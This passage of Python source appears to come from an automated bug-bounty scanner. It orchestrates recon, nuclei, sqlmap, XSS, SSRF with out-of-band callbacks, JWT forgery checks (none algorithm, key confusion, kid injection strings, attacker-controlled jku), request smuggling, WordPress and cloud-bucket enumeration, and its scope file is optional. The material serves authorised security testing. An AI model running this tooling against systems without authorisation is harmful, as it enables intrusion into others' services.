# 12. SPECIALISED RUNNERS
# ══════════════════════════════════════════════════════════════

class JWTRunner(BaseRunner):
    """a9-a13, oa21-oa25 — Full JWT attack suite via jwt_tool."""
    NAME = "jwt"
    CATEGORY = "special"

    JWT_RE = re.compile(
        r'(eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,})')

    def run(self) -> list:
        token = self._find_token()
        if not token:
            log("No JWT found to test", "skip", self.NAME, self.host)
            return self._local
        self._inspect(token)
        if JWT_TOOL.exists():
            self._jwt_tool_attacks(token)
        return self._local

    def _find_token(self) -> Optional[str]:
        for src in [self.opts.get("bearer", ""),
                    str(self.opts.get("cookie", ""))]:
            m = self.JWT_RE.search(src)
            if m:
                return m.group(1)
        for path in ["/", "/api/user", "/api/me"]:
            r = self.http(path)
            if r:
                m = self.JWT_RE.search(r["body"] + str(r["headers"]))
                if m:
                    return m.group(1)
        return None

    def _inspect(self, token: str):
        try:
            parts   = token.split(".")
            pad     = lambda s: s + "=" * (4 - len(s) % 4)
            header  = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
            payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            alg = header.get("alg", "")
            kid = header.get("kid", "")
            jku = header.get("jku") or header.get("x5u")
            exp = payload.get("exp", 0)

            if alg.lower() == "none":
                self.add("a10", "JWT uses 'none' algorithm", "critical", "certain",
                         "No signature — token forgeable without a key",
                         json.dumps(header))
            if alg.upper().startswith("RS"):
                self.add("a9", f"JWT RS-family ({alg}) — RS256→HS256 possible", "critical", "firm",
                         "Sign with server public key as HMAC secret",
                         f"alg: {alg}")
            if kid:
                self.add("a11", f"JWT kid: '{kid}'", "high", "tentative",
                         "Test: kid='../../dev/null', kid=1 OR 1=1 (SQLi)",
                         f"kid: {kid}")
            if jku:
                self.add("a13", f"JWT jku/x5u: {jku}", "critical", "certain",
                         "Replace jku with attacker-controlled JWK Set URL",
                         jku)
            if exp and (exp - time.time()) > 86400 * 30:
                self.add("a12", "JWT expiry > 30 days", "medium", "firm",
                         f"Valid for {(exp - time.time())/86400:.0f} more days",
                         str(exp))
            if exp and time.time() > exp:
                self.add("a12", "Expired JWT — test if server still accepts it", "high", "firm",
                         "Probe server-side exp validation", str(exp))
        except Exception as e:
            log(f"JWT decode error: {e}", "warn", self.NAME)

    def _jwt_tool_attacks(self, token: str):
        test_url = self.opts.get("jwt_endpoint",
                                  f"{self.base_url}/api/user")
        out_file = self.out / "jwt_tool_results.txt"
        cmd = ["python3", str(JWT_TOOL), token,
               "-t", test_url, "-M", "at", "-rc"]
        if self.opts.get("cookie"):
            cmd += ["-rh", f"Cookie: {self.opts['cookie']}"]

        lines: list = []
        for line in self.stream_cmd(cmd, timeout=300):
            lines.append(line)
        out_file.write_text("\n".join(lines))
        full = "\n".join(lines)

        for pat, cid, title, sev in [
            (r"(?i)CRITICAL.*none",      "a10", "JWT none alg accepted",   "critical"),
            (r"(?i)CRITICAL.*alg.*conf", "a9",  "JWT alg confusion",       "critical"),
            (r"(?i)CRITICAL.*kid.*path", "a11", "JWT kid path traversal",  "critical"),
            (r"(?i)CRITICAL.*kid.*sql",  "a11", "JWT kid SQL injection",   "critical"),
            (r"(?i)CRITICAL.*jku",       "a13", "JWT jku injection",       "critical"),
            (r"(?i)expired.*accept",     "a12", "Expired JWT accepted",    "high"),
        ]:
            if re.search(pat, full):
                self.add(cid, f"[jwt_tool] {title}", sev, "certain",
                         "jwt_tool confirmed vulnerability", full[:400])


class SmugglerRunner(BaseRunner):
    """c4, c5, c6 — HTTP request smuggling via smuggler.py."""
    NAME = "smuggler"
    CATEGORY = "special"

    def run(self) -> list:
        if not SMUGGLER.exists():
            log("smuggler.py not installed", "skip", self.NAME)
            return self._local
        out_file = self.out / "smuggler_results.txt"
        lines: list = []
        for line in self.stream_cmd([
            "python3", str(SMUGGLER),
            "--url", self.base_url,
            "--log", str(out_file),
            "--timeout", "10",
            "--schemes", "https,http",
        ], timeout=300):
            lines.append(line)
        combined = "\n".join(lines)
        if out_file.exists():
            combined += "\n" + out_file.read_text()
        for marker, cid, title, sev in [
            ("CL.TE",            "c4", "HTTP smuggling CL.TE",  "critical"),
            ("TE.CL",            "c5", "HTTP smuggling TE.CL",  "critical"),
            ("CL.0",             "c4", "HTTP smuggling CL.0",   "high"),
            ("HTTP/2 downgrade", "c6", "HTTP/2 smuggling",      "critical"),
        ]:
            if (marker.lower() in combined.lower()
                    and "vulnerable" in combined.lower()):
                self.add(cid, title, sev, "certain",
                         "smuggler.py confirmed desync vulnerability",
                         combined[:500])
        return self._local


class NiktoRunner(BaseRunner):
    """General-purpose web server security scanner."""
    NAME = "nikto"
    CATEGORY = "special"

    def run(self) -> list:
        if not self.registry.has("nikto"):
            log("nikto not found", "skip", self.NAME)
            return self._local
        cmd = [
            self.registry.path("nikto"),
            "-h",        self.base_url,
            "-maxtime",  "300",
            "-Tuning",   "013456789abcde",
            "-nointeractive",
        ]
        if self.opts.get("cookie"):
            cmd += ["-cookies", self.opts["cookie"]]
        for line in self.stream_cmd(cmd, timeout=400):
            if "+ " in line and "OSVDB" not in line:
                sev = ("high" if any(w in line.lower() for w in
                                     ["sql", "xss", "rce", "injection",
                                      "bypass", "overflow", "remote",
                                      "shell"]) else "low")
                self.add("nikto", f"[nikto] {line[2:80]}", sev, "firm", line[:200])
        return self._local


class WpscanRunner(BaseRunner):
    """wp1-wp13 — WordPress vulnerability scanning."""
    NAME = "wpscan"
    CATEGORY = "special"

    def run(self) -> list:
        if not self.registry.has("wpscan"):
            log("wpscan not found", "skip", self.NAME)
            return self._local
        out_json = self.out / "wpscan_results.json"
        cmd = [
            self.registry.path("wpscan"),
            "--url",               self.base_url,
            "--output",            str(out_json),
            "--format",            "json",
            "--enumerate",         "u,p,vp,vt,tt,cb,dbe",
            "--plugins-detection", "aggressive",
            "--no-banner",
        ]
        if os.environ.get("WPSCAN_API_TOKEN"):
            cmd += ["--api-token", os.environ["WPSCAN_API_TOKEN"]]
        if self.opts.get("cookie"):
            cmd += ["--cookie", self.opts["cookie"]]

        for _ in self.stream_cmd(cmd, timeout=600):
            pass

        if not out_json.exists():
            return self._local
        try:
            data = json.loads(out_json.read_text())
            for uname in data.get("users", {}):
                self.add("a1", f"WordPress user: {uname}", "medium", "certain",
                         "WPScan user enumeration", uname)
            for plugin, pd in data.get("plugins", {}).items():
                for vuln in pd.get("vulnerabilities", []):
                    score = vuln.get("cvss", {}).get("score", 5)
                    sev   = ("critical" if score >= 9 else
                             "high"     if score >= 7 else "medium")
                    self.add("wp1", f"WP plugin vuln: {vuln.get('title','')}", sev, "firm",
                             f"Plugin: {plugin}  CVSS: {score}",
                             str(vuln.get("references", {}))[:200])
            for vuln in data.get("version", {}).get("vulnerabilities", []):
                self.add("wp12", f"WP core vuln: {vuln.get('title','')}", "high", "firm",
                         str(vuln.get("references", {}))[:200])
        except Exception:
            pass
        return self._local


class S3ScannerRunner(BaseRunner):
    """r16, aws1, gcp1, az1 — Cloud storage bucket enumeration."""
    NAME = "s3scanner"
    CATEGORY = "special"

    CLOUD_CHECKS = [
        ("https://{n}.s3.amazonaws.com/",
         ["ListBucketResult", "<Contents>"], "aws1"),
        ("https://storage.googleapis.com/{n}/",
         ["ListBucketResult", "<Contents>"], "gcp1"),
        ("https://{n}.blob.core.windows.net/$web"
         "?restype=container&comp=list",
         ["EnumerationResults", "<Blob>"], "az1"),
    ]

    def run(self) -> list:
        base  = self.host.replace("www.", "").split(".")[0]
        names = [base] + [f"{base}{s}" for s in
                          ["-assets", "-static", "-uploads", "-backup",
                           "-prod", "-dev", "-staging", "-data",
                           "-files", "-media", "-logs", "-config"]]

        def probe(args):
            name, tmpl, markers, cid = args
            url = tmpl.format(n=name)
            r   = self.http(url)
            if r and r["status"] == 200 and any(m in r["body"]
                                                  for m in markers):
                return name, url, cid
            return None

        tasks = [(n, tmpl, m, cid)
                 for n in names
                 for tmpl, m, cid in self.CLOUD_CHECKS]

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
            for result in pool.map(probe, tasks):
                if result:
                    name, url, cid = result
                    self.add(cid, f"Public cloud bucket: {name}", "critical", "certain",
                             f"Contents listable: {url}", url)
        return self._local

# ══════════════════════════════════════════════════════════════
# 13. DECISION TREE  (real conditional branching)
# ══════════════════════════════════════════════════════════════

class DecisionTree:
    """
    Given a per-host tech profile, returns which runners to execute
    and which nuclei tag set to use.
    """

    BASE_NUCLEI = [
        "misconfig", "exposure", "takeover", "panel",
        "default-login", "cve", "tech", "auth-bypass",
    ]

    def decide(self, host: str, profile: dict) -> dict:
        techs  = set(profile.get("tech", []))
        is_cdn = profile.get("cdn", False)

        runners: list  = []
        skipped: dict  = {}
        tags:    set   = set(self.BASE_NUCLEI)

        def add(cls, reason):  runners.append((cls, reason))
        def skip(cls, reason): skipped[cls] = reason

        # ── Discovery: always ─────────────────────────────────
        add(WafRunner,            "Always: WAF detection")
        add(NaabuRunner,          "Always: port scan")
        add(GauRunner,            "Always: historical URL collection")
        add(KatanaRunner,         "Always: active crawl + JS link extraction")
        add(GitDumperRunner,      "Always: check .git exposure")
        add(SecretJSRunner,       "Always: JS secret + endpoint extraction")
        add(FeroxbusterRunner,    "Always: directory/file brute-force")
        add(Byp4xxRunner,         "Always: 403 bypass attempts")
        add(ParamDiscoveryRunner, "Always: hidden parameter discovery")
        add(S3ScannerRunner,      "Always: cloud storage bucket enumeration")

        # ── VHost: skip on CDN (Host header meaningless) ──────
        if is_cdn:
            skip(VHostRunner, "CDN detected — vhost results unreliable")
        else:
            add(VHostRunner, "Non-CDN: virtual host discovery")

        # ── Injection: always ─────────────────────────────────
        add(GFFilterRunner,  "Always: categorise param URLs via gf")
        add(SqlmapRunner,    "Always: SQL injection on gf-filtered params")
        add(DalfoxRunner,    "Always: XSS on gf-filtered params + blind OOB")
        add(SSRFRunner,      "Always: SSRF probe + OOB callbacks")
        add(CrlfuzzRunner,   "Always: CRLF injection scan")
        add(CorsyRunner,     "Always: CORS misconfiguration")
        add(JWTRunner,       "Always: JWT analysis if any token present")

        # ── Smuggling: only if reverse proxy / CDN detected ───
        proxy_tech = {
            "nginx", "apache", "haproxy", "varnish",
            "iis", "cloudflare", "traefik", "envoy",
            "akamai", "fastly",
        }
        if techs & proxy_tech or is_cdn:
            sig = (techs & proxy_tech) or {"cdn"}
            add(SmugglerRunner,
                f"Proxy/CDN detected ({sig}): HTTP smuggling test")
            tags.add("http-request-smuggling")
        else:
            skip(SmugglerRunner, "No proxy/CDN detected — smuggling skipped")

        # ── WordPress: only if detected ───────────────────────
        if techs & {"wordpress", "wp"}:
            add(WpscanRunner, "WordPress detected — WPScan with vuln DB")
            tags |= {"wordpress"}
        else:
            skip(WpscanRunner, "WordPress not detected")

        # ── Nikto: skip on CDN (unreliable results) ───────────
        if is_cdn:
            skip(NiktoRunner, "CDN — nikto results unreliable")
        else:
            add(NiktoRunner, "Non-CDN: general nikto scan")

        # ── Nuclei tag expansion based on detected tech ───────
        tech_tag_map = {
            frozenset(["drupal"]):                          {"drupal"},
            frozenset(["joomla"]):                          {"joomla"},
            frozenset(["laravel"]):                         {"laravel", "php"},
            frozenset(["codeigniter", "symfony"]):          {"php"},
            frozenset(["django", "flask", "fastapi"]):      {"python"},
            frozenset(["spring", "tomcat", "struts",
                        "glassfish", "weblogic"]):          {"java", "spring",
                                                             "actuator", "apache"},
            frozenset(["node.js", "express",
                        "next.js", "nuxt"]):                {"node", "nodejs"},
            frozenset(["ruby", "rails"]):                   {"ruby", "rails"},
            frozenset(["php"]):                             {"php"},
            frozenset(["aws", "amazon", "s3",
                        "cloudfront"]):                     {"aws", "s3", "cloud"},
            frozenset(["firebase", "gcp", "google"]):       {"gcp", "firebase",
                                                             "cloud"},
            frozenset(["azure"]):                           {"azure", "cloud"},
            frozenset(["elasticsearch", "kibana"]):         {"elasticsearch"},
            frozenset(["redis"]):                           {"redis"},
            frozenset(["mongodb"]):                         {"mongodb"},
            frozenset(["graphql"]):                         {"graphql", "api"},
            frozenset(["swagger", "openapi"]):              {"swagger", "api"},
        }
        for tech_set, new_tags in tech_tag_map.items():
            if techs & tech_set:
                tags |= new_tags

        # Always add full injection + auth coverage
        tags |= {
            "sqli", "xss", "ssrf", "ssti", "xxe", "lfi",
            "rce", "idor", "injection", "jwt", "oauth", "saml",
        }

        return {
            "runners":      runners,
            "nuclei_tags":  sorted(tags),
            "skip_reasons": skipped,
        }

# ══════════════════════════════════════════════════════════════
# 14. REPORTER
# ══════════════════════════════════════════════════════════════

class Reporter:
    def __init__(self, target: str, out_dir: Path,
                 store: FindingStore, dec_log: dict,
                 oob: OOBManager, ckpt: Checkpoint):
        self.target  = target
        self.out_dir = out_dir
        self.store   = store
        self.dec_log = dec_log
        self.oob     = oob
        self.ckpt    = ckpt

    def write_json(self) -> Path:
        p = self.out_dir / "REPORT.json"
        p.write_text(json.dumps({
            "target":         self.target,
            "timestamp":      datetime.utcnow().isoformat(),
            "summary":        self.store.count(),
            "total":          len(self.store.all()),
            "live_hosts":     self.ckpt.get("live_hosts", []),
            "oob_callbacks":  self.oob.callbacks,
            "decision_log":   {
                h: {
                    "runners": [(r.NAME, reason)
                                for r, reason in d.get("runners", [])],
                    "skipped": {c.NAME: r
                                for c, r in d.get("skip_reasons", {}).items()},
                }
                for h, d in self.dec_log.items()
            },
            "findings":       [f.to_dict() for f in self.store.all()],
        }, indent=2))
        return p

    def write_markdown(self) -> Path:
        counts   = self.store.count()
        findings = self.store.all()
        lines    = [
            f"# Bug Bounty Report — `{self.target}`",
            f"**Date:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}  ",
            f"**Findings:** {len(findings)} (deduplicated)  ",
            f"**Hosts scanned:** {len(self.ckpt.get('live_hosts', []))}",
            "",
            "## Severity Summary",
            "| Severity | Count |",
            "|----------|------:|",
        ]
        for sev in ["critical", "high", "medium", "low", "info"]:
            n = counts.get(sev, 0)
            if n:
                lines.append(
                    f"| {C.ICON[sev]} {sev.capitalize()} | **{n}** |")

        lines += ["", "## Decision Tree Log", ""]
        for host, d in self.dec_log.items():
            lines.append(f"### `{host}`")
            for cls, reason in d.get("runners", []):
                lines.append(f"  - ✓ `{cls.NAME}` — {reason}")
            for cls, reason in d.get("skip_reasons", {}).items():
                lines.append(f"  - ✗ `{cls.NAME}` — {reason}")
            lines.append("")

        if self.oob.callbacks:
            lines += ["## OOB Callbacks (Blind Vuln Confirmations)", ""]
            for cb in self.oob.callbacks:
                lines.append(
                    f"- **{cb.get('protocol','?').upper()}** "
                    f"from `{cb.get('remote-address','?')}` "
                    f"— `{cb.get('unique-id','')}`")
            lines.append("")

        lines += ["---", "## Findings", ""]
        for sev in ["critical", "high", "medium", "low", "info"]:
            sev_f = [f for f in findings if f.severity == sev]
            if not sev_f:
                continue
            lines.append(
                f"### {C.ICON[sev]} {sev.capitalize()} ({len(sev_f)})")
            lines.append("")
            for f in sev_f:
                lines += [
                    f"#### [{f.checklist_id}] {f.title} ({f.confidence})",
                    f"**Host:** `{f.target}` | **Tool:** `{f.tool}`",
                    "", f.detail or "", "",
                ]
                if f.evidence:
                    lines += ["```", f.evidence[:600], "```", ""]
                if f.remediation:
                    lines.append(f"> **Fix:** {f.remediation}")
                lines.append("")

        p = self.out_dir / "REPORT.md"
        p.write_text("\n".join(lines))
        return p

    def print_summary(self):
        counts = self.store.count()
        hosts  = len(self.ckpt.get("live_hosts", []))
        total  = len(self.store.all())
        print(f"""
{C.GREEN}{C.BOLD}{'═'*65}
  SCAN COMPLETE — {self.target}
  {hosts} hosts scanned  ·  {total} unique findings  ·  deduplicated
{'═'*65}{C.RESET}
  🔴 Critical : {counts.get('critical', 0):>4}
  🟠 High     : {counts.get('high', 0):>4}
  🟡 Medium   : {counts.get('medium', 0):>4}
  🔵 Low      : {counts.get('low', 0):>4}
  ⚪ Info     : {counts.get('info', 0):>4}
  {'─'*30}
  OOB callbacks : {len(self.oob.callbacks):>3}
""")

# ══════════════════════════════════════════════════════════════
# 15. APEX
# ══════════════════════════════════════════════════════════════

class Apex:
    def __init__(self, args):
        self.target   = (args.target
                         .replace("https://", "").replace("http://", "")
                         .rstrip("/"))
        self.base_url = f"https://{self.target}"
        self.out_dir  = Path(args.output) / self.target.replace(".", "_")
        self.out_dir.mkdir(parents=True, exist_ok=True)

        self.opts = {
            "cookie":        args.cookie,
            "bearer":        args.bearer,
            "extra_headers": args.header or [],
            "rate_limit":    args.rate_limit,
            "phase":         args.phase,
            "workers":       args.workers,
            "oob":           args.oob,
            "webhook":       args.webhook,
            "min_conf":      args.min_confidence,
            "scope_patterns": self._load_scope(args.scope),
        }
        self.registry = ToolRegistry()
        self.oob      = OOBManager(self.registry)
        self.store    = FindingStore(webhook=args.webhook, min_conf=args.min_confidence)
        self.ckpt     = Checkpoint(self.out_dir / "checkpoint.json")
        self.tree     = DecisionTree()
        self.dec_log: dict  = {}
        self._decision_cache: dict = {}
        self._cache_lock = threading.Lock() # Fix 1

        if not args.resume and self.ckpt.path.exists():
            log("Fresh scan — clearing previous checkpoint", "info")
            self.ckpt.path.unlink()
            self.ckpt = Checkpoint(self.out_dir / "checkpoint.json")

        signal.signal(signal.SIGINT, self._on_sigint)

    def _load_scope(self, scope_path: Optional[str]) -> list:
        if not scope_path or not Path(scope_path).exists():
            return []
        return [line.strip() for line in Path(scope_path).read_text().splitlines()
                if line.strip() and not line.startswith("#")]

    def _is_in_scope(self, host: str) -> bool:
        if not self.opts["scope_patterns"]:
            return True
        return any(fnmatch.fnmatch(host, p) for p in self.opts["scope_patterns"])

    def _on_sigint(self, *_):
        print(f"\n{C.YELLOW}[!] Interrupted — checkpoint saved. "
              f"Resume with --resume{C.RESET}")
        self.ckpt.save()
        self.oob.stop()
        sys.exit(0)

    # ── factory / runner helpers ───────────────────────────────

    def _make(self, cls, host: str) -> BaseRunner:
        return cls(host, self.out_dir, self.registry,
                   self.oob, self.store, self.ckpt, self.opts)

    def _run(self, cls, host: str, skip_if_done: bool = True):
        """Run one runner on one host. Respects checkpoint."""
        if not self._is_in_scope(host):
            return
        
        if skip_if_done and self.ckpt.is_done(cls.NAME, host):
            log("Already complete — skipping", "skip", cls.NAME, host)
            return
        runner = self._make(cls, host)
        try:
            runner.run()
            runner.save_local()
            self.ckpt.mark_done(cls.NAME, host)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            log(f"Runner error: {e}", "error", cls.NAME, host)

    def _phase_ok(self, phase: str) -> bool:
        return self.opts.get("phase", "all") in ("all", phase)

    def _run_parallel(self, hosts: list, profiles: dict,
                      runner_classes: list):
        max_w = min(self.opts.get("workers", 3), max(len(hosts), 1))

        def scan_host(url: str):
            host    = urllib.parse.urlparse(url).netloc or url
            profile = profiles.get(host, profiles.get(url, {}))

            if not self._is_in_scope(host):
                return

            with self._cache_lock: # Fix 1
                if host not in self._decision_cache:
                    self._decision_cache[host] = self.tree.decide(host, profile)
                    self.dec_log[host] = self._decision_cache[host]
                decision = self._decision_cache[host]

            for cls, reason in decision["runners"]:
                if cls not in runner_classes:
                    continue
                self._run(cls, url)

        with concurrent.futures.ThreadPoolExecutor(
                max_workers=max_w) as pool:
            futures = {pool.submit(scan_host, url): url
                       for url in hosts}
            for fut in concurrent.futures.as_completed(futures):
                url = futures[fut]
                try:
                    fut.result()
                except Exception as e:
                    log(f"Host error: {e}", "error", host=url)

    def _run_nuclei_per_host(self, hosts: list, profiles: dict):
        for url in hosts:
            host    = urllib.parse.urlparse(url).netloc or url
            profile = profiles.get(host, profiles.get(url, {}))

            if not self._is_in_scope(host):
                continue

            with self._cache_lock: # Fix 1
                if host not in self._decision_cache:
                    self._decision_cache[host] = self.tree.decide(host, profile)
                    self.dec_log[host] = self._decision_cache[host]
                tags = self._decision_cache[host]["nuclei_tags"]

            if self.ckpt.is_done(NucleiRunner.NAME, url):
                log("Already done — skipping", "skip", NucleiRunner.NAME, host)
                continue

            log(f"Tags: {', '.join(tags[:8])}{'...' if len(tags)>8 else ''}",
                "info", "nuclei", host)
            runner = NucleiRunner(url, self.out_dir, self.registry,
                                  self.oob, self.store, self.ckpt, self.opts)
            runner.run(tags)
            runner.save_local()
            self.ckpt.mark_done(NucleiRunner.NAME, url)

    # ── main entry ─────────────────────────────────────────────

    def run(self):
        # Start OOB listener
        if self.opts["oob"]:
            self.oob.start(self.out_dir)

        # ── Phase 1: Subdomain recon ───────────────────────────
        if self._phase_ok("recon"):
            log("PHASE 1 — Subdomain & DNS Recon", "phase")
            self._run(SubfinderRunner, self.target)
            self._run(DNSXRunner,      self.target)

        # ── Phase 2: Fingerprint all live hosts ────────────────
        log("PHASE 2 — Live Host Fingerprinting", "phase")
        fp = self._make(HttpxFingerprintRunner, self.target)
        if not self.ckpt.is_done(HttpxFingerprintRunner.NAME, self.target):
            fp.run()
            fp.save_local()
            self.ckpt.mark_done(HttpxFingerprintRunner.NAME, self.target)

        profiles   = fp.profiles()
        live_hosts = fp.live_urls() or [self.base_url]

        for h in live_hosts:
            self.ckpt.append("live_hosts", h)
        log(f"{len(live_hosts)} live hosts to scan", "ok")

        # ── Phase 3: Per-host discovery ────────────────────────
        if self._phase_ok("discover"):
            log("PHASE 3 — Per-Host Discovery", "phase")
            self._run_parallel(live_hosts, profiles, [
                WafRunner, VHostRunner, NaabuRunner, GauRunner,
                KatanaRunner, FeroxbusterRunner, Byp4xxRunner,
                GitDumperRunner, SecretJSRunner, ParamDiscoveryRunner,
            ])

        # ── Phase 4: Nuclei (per-host, tailored tags) ─────────
        if self._phase_ok("vuln"):
            log("PHASE 4 — Vulnerability Scanning (nuclei)", "phase")
            self._run_nuclei_per_host(live_hosts, profiles)

        # ── Phase 5: Injection (per-host, parallel) ───────────
        if self._phase_ok("inject"):
            log("PHASE 5 — Injection Testing", "phase")
            self._run_parallel(live_hosts, profiles, [
                GFFilterRunner, SqlmapRunner, DalfoxRunner,
                SSRFRunner, CrlfuzzRunner, CorsyRunner,
            ])

        # ── Phase 6: Specialised (per-host, parallel) ─────────
        if self._phase_ok("special"):
            log("PHASE 6 — Specialised Attacks", "phase")
            self._run_parallel(live_hosts, profiles, [
                JWTRunner, SmugglerRunner, NiktoRunner,
                WpscanRunner, S3ScannerRunner,
            ])

        # ── Collect final OOB callbacks ────────────────────────
        if self.oob._active:
            log("Waiting 30s for final OOB callbacks...", "info", "oob")
            time.sleep(30)
            self.oob.stop()
            for cb in self.oob.callbacks:
                self.store.add(Finding(
                    "ss9/i9/i16",
                    f"OOB callback: {cb.get('protocol','?').upper()} "
                    f"from {cb.get('remote-address','?')}",
                    "high", "certain",
                    "Out-of-band interaction confirms blind SSRF/XXE/RCE",
                    json.dumps(cb)[:300],
                    "interactsh",
                    self.target,
                ))

        # ── Report ─────────────────────────────────────────────
        reporter = Reporter(self.target, self.out_dir, self.store,
                            self.dec_log, self.oob, self.ckpt)
        json_p = reporter.write_json()
        md_p   = reporter.write_markdown()
        reporter.print_summary()
        print(f"  {C.CYAN}📄 JSON : {json_p}")
        print(f"  📝 MD   : {md_p}{C.RESET}\n")

# ══════════════════════════════════════════════════════════════
# 16. ENTRY POINT
# ══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description=f"Apex v{VERSION} — Kali/WSL2",
        formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument("-t", "--target",
                        help="Target domain (e.g. example.com)")
    parser.add_argument("--cookie",
                        help="Session cookie for all requests")
    parser.add_argument("--bearer",
                        help="Bearer/JWT token for Authorization header")
    parser.add_argument("--header", action="append",
                        help="Extra header (repeatable): 'X-Foo: bar'")
    parser.add_argument("--oob", action="store_true",
                        help="Start interactsh for OOB blind detection")
    parser.add_argument("--resume", action="store_true",
                        help="Resume from checkpoint (skip completed steps)")
    parser.add_argument("--rate-limit", type=int, default=100,
                        metavar="N",
                        help="Max requests/sec per tool (default: 100)")
    parser.add_argument("--workers", type=int, default=3,
                        metavar="N",
                        help="Parallel host workers (default: 3)")
    parser.add_argument("--phase", default="all",
                        choices=["all", "recon", "discover",
                                 "vuln", "inject", "special"],
                        help="Run only one phase (default: all)")
    parser.add_argument("--output", default="./bounty_output",
                        help="Output directory (default: ./bounty_output)")
    parser.add_argument("--tools-check", action="store_true",
                        help="Print tool availability and exit")
    parser.add_argument("--scope",
                        help="Path to scope.txt (one pattern per line, e.g. *.example.com)")
    parser.add_argument("--webhook",
                        help="Discord/Slack webhook URL for critical findings")
    parser.add_argument("--min-confidence", default="tentative",
                        choices=["certain", "firm", "tentative"],
                        help="Minimum confidence level to report (default: tentative)")

    args = parser.parse_args()

    if args.tools_check:
        ToolRegistry().print_status()
        sys.exit(0)

    if not args.target:
        parser.error("-t/--target is required")

    Apex(args).run()


if __name__ == "__main__":
    main()
